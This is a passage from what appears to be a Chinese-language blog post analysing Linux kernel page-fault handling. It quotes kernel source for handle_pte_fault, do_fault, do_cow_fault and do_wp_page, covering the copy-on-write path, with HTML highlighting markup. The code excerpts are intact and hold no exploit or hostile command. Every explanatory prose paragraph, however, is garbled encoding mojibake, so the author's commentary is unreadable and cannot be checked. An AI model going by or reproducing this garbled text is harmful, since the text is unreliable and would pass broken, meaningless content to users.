VM_FAULT_OOM;</span><br><span class="line">	pmd = pmd_alloc(mm, pud, address);</span><br><span class="line">	<span class="keyword">if</span> (!pmd)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	<span class="keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;</span><br><span class="line">		<span class="keyword">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);</span><br><span class="line">		<span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">pmd_t</span> orig_pmd = *pmd;</span><br><span class="line">		<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">		barrier();</span><br><span class="line">		<span class="keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If the pmd is splitting, return and retry the</span></span><br><span class="line"><span class="comment">			 * the fault.  Alternative: wait until the split</span></span><br><span class="line"><span class="comment">			 * is done, and goto retry.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (pmd_trans_splitting(orig_pmd))</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (pmd_protnone(orig_pmd))</span><br><span class="line">				<span class="keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,</span><br><span class="line">							     orig_pmd, pmd);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;</span><br><span class="line">				ret = wp_huge_pmd(mm, vma, address, pmd,</span><br><span class="line">							orig_pmd, flags);</span><br><span class="line">				<span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line">					<span class="keyword">return</span> ret;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				huge_pmd_set_accessed(mm, vma, address, pmd,</span><br><span class="line">						      orig_pmd, dirty);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span></span><br><span class="line"><span class="comment">	 * run pte_offset_map on the pmd, if an huge pmd could</span></span><br><span class="line"><span class="comment">	 * materialize from under us from a different thread.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</span><br><span class="line">	    unlikely(__pte_alloc(mm, vma, pmd, address)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	<span class="comment">/* if an huge pmd materialized from under us just retry later */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A regular pmd is established and it can&#x27;t morph into a huge pmd</span></span><br><span class="line"><span class="comment">	 * from under us anymore at this point because we hold the mmap_sem</span></span><br><span class="line"><span class="comment">	 * read mode and khugepaged takes it in write mode. So now it&#x27;s</span></span><br><span class="line"><span class="comment">	 * safe to run pte_offset_map().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	pte = pte_offset_map(pmd, address);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›¸ä¿¡çœ‹è¿‡æˆ‘å‰é¢é‚£ç¯‡æ–‡ç« çš„éƒ½ä¸ä¼šé™Œç”Ÿ<code>pgd | pud | pmd | pte</code>è¿™å››ä¸ªé¡µè¡¨ï¼Œä»–ä»¬åˆ†è¡¨è¡¨ç¤ºçš„æ˜¯<code>é¡µå…¨å±€ç›®å½•ï½œé¡µä¸Šçº§ç›®å½•ï½œé¡µä¸­é—´ç›®å½•ï½œé¡µè¡¨é¡¹</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¸­é¦–å…ˆåˆ™æ˜¯é€šè¿‡mmè·å–åˆ°pgdé¡µå…¨å±€ç›®å½•ï¼Œéšåç”Ÿæˆpudå’Œpmdå¹¶ä¸ºpmdåˆ›å»ºä¸­é—´é¡¹ï¼Œåœ¨æœ€åè´§æ¸ é“pteå¹¶è¿›å…¥åˆ°å¤„ç†å‡½æ•°<code>handle_pte_fault</code>ä¸­ã€‚</p>
<h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a><strong>handle_pte_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">		     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">		     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * some architectures can have larger ptes than wordsize,</span></span><br><span class="line"><span class="comment">	 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></span><br><span class="line"><span class="comment">	 * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></span><br><span class="line"><span class="comment">	 * The code below just needs a consistent view for the ifs and</span></span><br><span class="line"><span class="comment">	 * we later double check anyway with the ptl lock held. So here</span></span><br><span class="line"><span class="comment">	 * a barrier will do.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	entry = *pte;</span><br><span class="line">	barrier();</span><br><span class="line">	<span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">				<span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">							 pte, pmd, flags);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">						flags, entry);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">					pte, pmd, flags, entry);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pte_protnone(entry))</span><br><span class="line">		<span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">	ptl = pte_lockptr(mm, pmd);</span><br><span class="line">	spin_lock(ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">			<span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">					pte, pmd, ptl, entry);</span><br><span class="line">		entry = pte_mkdirty(entry);</span><br><span class="line">	&#125;</span><br><span class="line">	entry = pte_mkyoung(entry);</span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">		update_mmu_cache(vma, address, pte);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * This is needed only for protection faults but the arch code</span></span><br><span class="line"><span class="comment">		 * is not yet telling us if this is a protection fault or not.</span></span><br><span class="line"><span class="comment">		 * This still avoids useless tlb flushes for .text page faults</span></span><br><span class="line"><span class="comment">		 * with threads.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">			flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">	&#125;</span><br><span class="line">unlock:</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°å¼€å¤´åˆå§‹åŒ–<code>entry</code>ä¸ºpteçš„å†…å­˜é¡µç„¶åæˆ‘ä»¬ç»§ç»­é€è¡Œåˆ†æã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">      <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                               pte, pmd, flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">                      flags, entry);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåˆ¤æ–­é¡µè¡¨æ˜¯å¦å­˜åœ¨äºä¸»å­˜ä¸­ï¼Œæ¥ç€åˆ¤æ–­æ˜¯å¦ä¸ºnoneï¼Œå¦‚æœä¸ºç©ºåˆ™è¡¨ç¤ºç¬¬ä¸€æ¬¡è®¿é—®è¯¥é¡µï¼Œé‚£ä¹ˆç»§ç»­è¿›å…¥åˆ¤æ–­vmaæ˜¯å¦ä¸ºåŒ¿ååŒºï¼Œå¦‚æœä¸æ˜¯åˆ™æ‰§è¡Œ<code>do_fault</code>è¿”å›ç‰©ç†é¡µã€‚å¦‚æœè¯¥é¡µä¸ä¸ºç©ºï¼Œè½¯æ€§ç¼ºé¡µå¼‚å¸¸ä¸­çš„ç¬¬äºŒç§æƒ…å†µï¼Œä»£è¡¨è¯¥é¡µä»¥å‰å­˜åœ¨äºä¸»å­˜ä¸­ä½†æ˜¯è¢«è°ƒå‡ºäº†ã€‚</p>
<p>ç¨‹åºç»§ç»­å¾€åæ‰§è¡Œï¼Œä¸‹æ–¹ä»£è¡¨çš„æ˜¯å†…å­˜é¡µå­˜åœ¨äºä¸»å­˜ä¸­æ—¶çš„æƒ…å†µã€‚</p>
<p>é¦–å…ˆåˆ™æ˜¯å…ˆåŠ äº†ä¸€å±‚é”<code>spin_lock(ptl);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">    <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, ptl, entry);</span><br><span class="line">  entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆé€šè¿‡flagsåˆ¤æ–­æ˜¯å¦æ˜¯åº”ä¸ºå†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ï¼Œç´§æ¥ç€çœ‹å¯¹åº”çš„é¡µæ˜¯å¦å¯å†™ï¼Œå¦‚æœä¸å¯å†™åˆ™è¿›å…¥<code>do_wp_page</code>å‡½æ•°ä¸­ã€‚åç»­å°±æ˜¯å°†è¯¥é¡µæ ‡è„å’Œæ ‡ä¸Šå·²ç»è®¿é—®è¿‡ã€‚</p>
<p>ç»è¿‡ä¸Šè¿°æµç¨‹ä¸éš¾å‘ç°å½“ä¸€ä¸ªè¿›ç¨‹é¦–æ¬¡è®¿é—®ä¸€ä¸ªä¸å¯å†™çš„å†…å­˜é¡µæ—¶ä¼šè§¦å‘ä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸ï¼Œä¸€æ¬¡æ˜¯é¡µä¸å­˜åœ¨äºä¸»å­˜ä¸­çš„æƒ…å†µï¼Œç¬¬äºŒæ¬¡æ˜¯ä¸‹é¢å­˜åœ¨äºä¸»å­˜çš„æƒ…å†µã€‚</p>
<p>é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ç¬¬ä¸€æ¬¡è¿›å…¥çš„æƒ…å†µï¼Œæ­¤æ—¶å¤„ç†çš„å‡½æ•°ä¸º<code>do_fault</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å°±æ˜¯ä¸‹é¢åˆ¤æ–­ï¼Œå¦‚æœæ˜¯éå†™çš„æ“ä½œå¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_read_fault</code>å‡½æ•°ï¼Œå¦‚æœæ˜¯éå…±äº«å†…å­˜å¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_cow_fault</code>ï¼Œå¦‚æœæ˜¯å› ä¸ºå…±äº«å†…å­˜å¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_shared_fault</code>å‡½æ•°ä¸­å»ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	<span class="keyword">pte_t</span> *pte;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line">	<span class="keyword">if</span> (!new_page)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">		page_cache_release(new_page);</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fault_page)</span><br><span class="line">		copy_user_highpage(new_page, fault_page, address, vma);</span><br><span class="line">	__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">		<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">			unlock_page(fault_page);</span><br><span class="line">			page_cache_release(fault_page);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment">			 * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line">	&#125;</span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">	mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">	lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">		unlock_page(fault_page);</span><br><span class="line">		page_cache_release(fault_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment">		 * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">	mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">	page_cache_release(new_page);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®åå­—å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå‡½æ•°æ˜¯æˆ‘ä»¬æ¯”è¾ƒå…³æ³¨çš„å‡½æ•°ï¼Œ<code>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</code>é¦–å…ˆåˆ™å°±æ˜¯åˆ›å»ºä¸€ä¸ªç‰©ç†é¡µã€‚<code>ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</code>è¿™é‡Œè¯»å–æ–‡ä»¶çš„å†…å®¹åˆ°<code>fault_page</code>ä¸­å»ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">  copy_user_highpage(new_page, fault_page, address, vma);</span><br></pre></td></tr></table></figure>

<p>éšååœ¨è¿™é‡Œå°†<code>fault_page</code>ä¸­çš„å†…å®¹æ‹·è´åˆ°<code>new_page</code>ä¸­å»ã€‚</p>
<p><code>if (unlikely(!pte_same(*pte, orig_pte))) </code>è¿™é‡ŒéªŒè¯pteå’Œ<code>orig_ptr</code>æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´åˆ™è¡¨ç¤ºpteä¸­é€”è¢«ä¿®æ”¹è¿‡é‚£ä¹ˆç›´æ¥é‡Šæ”¾ä¸¤ä¸ªå†…å­˜é¡µä¹‹åé€€å‡ºã€‚</p>
<p><code>do_set_pte(vma, address, new_page, pte, true, true);</code>åœ¨è¿™é‡Œè®¾ç½®pteä¸­çš„æ ‡å¿—ä½å¹¶ä¸”æ ‡ä¸Š<code>dirty</code>æ ‡å¿—ä½ï¼Œä¸è¿‡å› ä¸ºä¼šæ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸ºå¯å†™å¦‚æœä¸æ˜¯åˆ™ä¸ä¼šæ ‡è®°ä¸Š<code>write</code>ï¼Œæœ€åé‡Šæ”¾<code>fault_page</code>ç»“æŸå‡½æ•°ã€‚</p>
<p>åœ¨è¿›è¡Œå®Œç¬¬ä¸€æ­¥ä¹‹åå¦‚æœé¡µé¢ä¸å¯å†™çš„è¯å°±ä¼šè¿›å…¥åˆ°ç¬¬äºŒæ­¥ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">	old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!old_page) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment">		 * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment">		 * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">				     (VM_WRITE|VM_SHARED))</span><br><span class="line">			<span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">		pte_unmap_unlock(page_table, ptl);</span><br><span class="line">		<span class="keyword">return</span> wp_page_copy(mm, vma, 